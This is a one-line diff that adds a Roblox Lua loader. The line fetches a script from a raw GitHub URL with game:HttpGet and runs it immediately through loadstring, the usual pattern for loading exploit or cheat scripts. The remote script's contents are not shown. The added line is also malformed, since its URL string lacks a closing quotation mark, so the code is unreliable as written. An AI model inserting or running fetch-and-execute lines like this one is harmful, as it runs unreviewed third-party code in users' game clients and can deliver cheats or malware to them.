@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/byte1z/wait-for-1-year/refs/heads/main/script.lua))()
